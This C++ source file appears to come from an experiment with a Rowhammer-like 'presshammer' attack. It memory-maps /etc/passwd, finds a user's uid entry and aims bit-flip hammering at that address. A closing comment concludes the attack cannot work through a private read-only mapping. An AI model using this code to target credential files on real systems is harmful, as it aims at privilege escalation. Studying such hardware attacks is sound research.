#include "content.h"

namespace color {
    constexpr const char* RESET  = "\033[0m";
    constexpr const char* RED    = "\033[31m";
    constexpr const char* GREEN  = "\033[32m";
    constexpr const char* YELLOW = "\033[33m";
    constexpr const char* BLUE   = "\033[34m";
}


int openCriticalFile(const char *filePath){
    // opens in read-only mode because we do not have write permissions from userland
    int fd = open(filePath, O_RDONLY);
    if(fd == -1){
        std::cerr << color::RED << "[!] " << color::RESET << "Error opening file: " << filePath << std::endl;
        perror("open");
        close(fd);
        exit(EXIT_FAILURE);
    }

    return fd;
}


void showContent(const char *filePath, char *content){
    std::cout << "\n" << "----------- " << color::RED << "Target file: " << filePath << color::RESET <<  " -----------" << '\n'
    << "\n" << content << '\n'
    << "--------------------------------------------" << "\n" << std::endl;

}


void checkContentFile(bool isDoubleSided){
    std::cout << color::BLUE << "[*] " << color::RESET << "CHECK CONTENT FILE" << std::endl;

    //1. opens the critical file
    const char* filePath = "/etc/passwd";
    int fd = openCriticalFile(filePath);


    // obtains file size
    struct stat sb;

    if(fstat(fd, &sb) == -1){
        std::cerr << color::RED << "[!] " << color::RESET << "Error getting file size: " << filePath << std::endl;
        perror("fstat");
        close(fd);
        exit(EXIT_FAILURE);
    }


    //2. mapping in read-only and private mode (does not share changes with disk) 
    // if you have write permissions you can use MAP_SHARED for synchronization with the disk but it means you are executing as root in this case
    auto mappedTarget = (void*) mmap(nullptr, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mappedTarget == MAP_FAILED){
        std::cerr << color::RED << "[!] " << color::RESET << "mmap failed" << std::endl;
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    
    // gets uid content data and show it
    char *content = (char *) mappedTarget;
    showContent(filePath, content);


    //3. gets uid address 
    const char *stringUid = "x:1000:";
    char *uidFound = std::strstr(content, stringUid);
    if(!uidFound){
        std::cerr << color::RED << "[!] " << color::RESET << "Pattern not found" << std::endl;
        exit(EXIT_FAILURE);
    }

    //4. gets target address
    volatile char *uidTargetAddress = (volatile char*) uidFound;
    volatile char *fileTargetAddress = (volatile char*) mappedTarget;
    uintptr_t uidTarget = (uintptr_t) uidTargetAddress;
    uintptr_t fileTarget = (uintptr_t) fileTargetAddress;

    // show info
    std::cout << "------------------- " << color::BLUE << "Info" << color::RESET << " -------------------" << "\n"
    << color::BLUE << "[*] " << color::RESET << filePath << " memory address: " << std::hex << fileTarget << std::dec << "\n"
    << color::BLUE << "[*] " << color::RESET << "Pattern " << stringUid << "found at: " << (uidFound - content) << "\n"
    << color::BLUE << "[*] " << color::RESET << "Pattern memory address: " << std::hex << uidTarget << std::dec << "\n"
    <<  "--------------------------------------------" << std::endl;

    // 5. attempt to apply presshammer
    if(isDoubleSided){
        doubleSidedPresshammer(uidTarget);
    }else{
        singleSidedPresshammer(uidTarget);
    }


    // CONLUSION
    /* 
    in this case, although we are pointing to real file content in memory (unlike the inode metadata),
    the memory mapping is read-only and private (MAP_PRIVATE), which means:
    
    - any modifications from userland would not be reflected back to the original file.
    - even if bit flips were successful via presshammer, they would only affect the local memory space.
    - in order to make permanent changes, we would need to:
        1. Map the file with write permissions (requires root).
        2. Use MAP_SHARED to synchronize memory changes to disk.
        3. Call msync() or close() to flush modifications.
    
    therefore, as we lack the necessary privileges to write, the attack remains unfeasible. Not make sanse apply this attack to these cases.
    */

}